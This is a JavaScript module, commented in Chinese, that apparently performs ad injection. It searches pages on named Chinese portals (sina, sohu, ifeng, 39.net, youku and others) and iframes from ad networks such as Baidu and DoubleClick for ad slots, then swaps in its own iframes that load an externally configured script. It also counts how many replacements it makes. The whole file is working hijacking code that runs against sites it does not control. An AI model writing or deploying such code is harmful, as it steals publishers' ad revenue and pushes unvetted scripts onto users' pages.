import { AD_REPLACE640, AD_REPLACE300 } from './config';

const pcreplaceArr = [{ // PC端替换的广告
  src: AD_REPLACE300,
  size: '300:250',
  ceil: 50,
  status: 0,
}];
const adreplaceArr = [{ // 移动端替换的广告
  src: AD_REPLACE640,
  ratio: 100 / 640,
  ceil: 1,
  status: 0,
}];

const sizes = ['300:250']; // PC可替换尺寸
const websites = [ // PC固定广告位
  { name: '39.net', nodes: ['[class="artRbox MB15"]', '[class="artRbox MB20"]'] },
  { name: '500.com', nodes: ['page-ads', '.tz-fkcq', '.news_right_ad'] },
  { name: 'ifeng.com', nodes: ['.pic1000', '.adbox02', '.pic300', '.bd_t5', '.pao_ad_02'] },
  { name: 'sina.com', nodes: ['[class="sinaads sinaads-done"]>ins>a'] },
  { name: 'sohu.com', nodes: ['.swf-top', '.godR'] },
  { name: 'tianya.cn', nodes: ['.adsame-box', '#adsp_popwindow_div'] },
  { name: 'youku.com', nodes: ['.yk-AD-tong', '.ad-flag-wrap'] },
];
const onLabel = [ // 包含广告联盟链接的标签
  "div[src*='//nex.163.com']>iframe",
  "script[src*='//pos.baidu.com/']",
  "iframe[src*='//static-alias-1.360buyimg.com']",
  "iframe[src*='//images.sohu.com']",
  "iframe[src*='//same.eastmoney.com']",
  "iframe[src*='hxsame.hexun.com']", // pc
  "iframe[src*='ifengimg.com']",
  "a[href*='//saxn.sina.com.cn']",
  "a[href*='//click.bes.baidu.com']",
  "iframe[href*='//strip.taobaocdn.com']",
  "a[href*='//b.mct01.com']",
  "a[href*='//ccc-x.jd.com']",
  "a[href*='//e1.feather.ifeng.com']",
];
const inIframe = [ // iframe内部的广告联盟链接
  "iframe[src*='//googleads.g.doubleclick.net']",
  "script[src*='//pos.baidu.com/']",
  "script[src*='//c0.ifengimg.com']",
  "iframe[src*='//www.ifeng.com']",
  "script[src*='//theta.sogoucdn.com']",
];

// ad宽度取整，2、3位数时末位为0,4位数时末两位为0
const changeWH = (num) => {
  const integerWH = Math.floor(num);
  const numlen = integerWH.toString().length;
  let finalWH = 0;
  switch (numlen) {
    case 2:
      finalWH = parseInt(Math.round(integerWH / 10), 10) * 10;
      break;
    case 3:
      finalWH = parseInt(Math.round(integerWH / 10), 10) * 10;
      break;
    case 4:
      finalWH = parseInt(integerWH / 100, 10) * 100;
      break;
    default:
      finalWH = 0;
  }
  return finalWH;
};

function isValuableRes(item) {
  const h = parseInt(getComputedStyle(item).height, 10);
  const w = parseInt(getComputedStyle(item).width, 10);
  const wh = `${changeWH(w)}:${changeWH(h)}`;
  for (let index = 0; index < sizes.length; index++) {
    const size = sizes[index];
    if (wh === size) return wh;
  }
  return false;
}

// <img src="//643108e7617ef.cdn.sohucs.com/b3b575305920429ea56362dbc1bd6526.jpg">
// <img src="https://ubmcmm.baidustatic.com/media/v1/0f000K00VmHXt2AS88Alqf.jpg">
function wrapIframe(target, obj, width, height) {
  const iframe = document.createElement('iframe');
  const scr = document.createElement('script');
  // const img = document.createElement('img');
  // img.src = 'https://ubmcmm.baidustatic.com/media/v1/0f000K00VmHXt2AS88Alqf.jpg';
  // img.style.position = 'absolute';
  // img.style.zIndex = '-1';
  iframe.frameBorder = '0';
  iframe.scrolling = 'no';
  iframe.marginwidth = '0';
  iframe.marginheight = '0';
  iframe.setAttribute('adtype', 'ifrvb');
  iframe.style.height = `${parseInt(height, 10) < 100 ? '84px' : height}`; // 兼容IE:use strict状态style为只读
  iframe.style.width = width;
  iframe.sandbox = 'allow-forms allow-scripts allow-same-origin allow-popups';
  scr.src = obj.src;

  target.parentNode.replaceChild(iframe, target);
  const { body } = iframe.contentDocument;
  body.style.margin = 0;
  body.appendChild(scr);
  // body.appendChild(img);
}

function consumeMobile(target) {
  if ((getComputedStyle(target) && getComputedStyle(target).display === 'none') || getComputedStyle(target.parentNode).display === 'none') return;
  const adIndex = Math.floor(Math.random() * (adreplaceArr.length - 1));
  const ad = adreplaceArr[adIndex] || '';
  if (ad && ad.status < ad.ceil) {
    const h = window.innerWidth * ad.ratio;
    wrapIframe(target, ad, '100%', `${h}px`);
    ad.status++;
    console.log(ad.status);
  }
}

function consumePC(target) {
  const wh = isValuableRes(target);
  const len = pcreplaceArr.length;
  if (wh) {
    for (let i = 0; i < len; i++) {
      const data = pcreplaceArr[i];
      if (data.status < data.ceil && data.size === wh) { // 检查上限和查找广告
        const arr = wh.split(':');
        wrapIframe(target, data, `${arr[0]}px`, `${arr[1]}px`);
        data.status++;
        break;
      }
    }
  }
}

function mobileReplace() {
  // 针对广告联盟域名在标签上的广告位
  // for (let i = 0; i < onLabel.length; i++) {
  //   const labels = window.top.document.querySelectorAll(onLabel[i]);
  //   for (let j = 0; j < labels.length; j++) consumeMobile(labels[j]);
  // }
  // 针对广告联盟域名在iframe内部的广告位
  const iframes = window.top.document.querySelectorAll('iframe');
  const ifrLen = iframes.length;
  for (let i = 0; i < ifrLen; i++) {
    if (iframes[i].getAttribute('adtype') !== 'ifrvb') consumeMobile(iframes[i]);
    // for (let j = 0; j < inIframe.length; j++) {
    //   if (iframes[i].getAttribute('adtype') === 'ifrvb') break;
    //   const isAd = iframes[i].contentDocument && iframes[i].contentDocument.querySelector(inIframe[j]);
    //   if (isAd) {
    //     consumeMobile(iframes[i]);
    //     break;
    //   }
    // }
  }
}

function PCReplace() {
  if (!AD_REPLACE300) return;
  // 针对div固定标签
  const { host } = window.top.location;
  const webLen = websites.length;
  for (let i = 0; i < webLen; i++) {
    if (host.indexOf(websites[i].name) > -1) {
      const { nodes } = websites[i];
      const len = nodes.length;
      for (let x = 0; x < len; x++) {
        const targets = window.top.document.querySelectorAll(nodes[x]);
        const num = targets.length;
        if (!num) continue;
        for (let j = 0; j < num; j++) {
          consumePC(targets[j]);
        }
      }
      break;
    }
  }
  // 针对iframe
  const iframes = window.top.document.querySelectorAll('iframe');
  const ifrLen = iframes.length;
  for (let i = 0; i < ifrLen; i++) {
    if (iframes[i].getAttribute('adtype') === 'ifrvb') continue;
    consumePC(iframes[i]);
  }
}

export { mobileReplace, PCReplace };
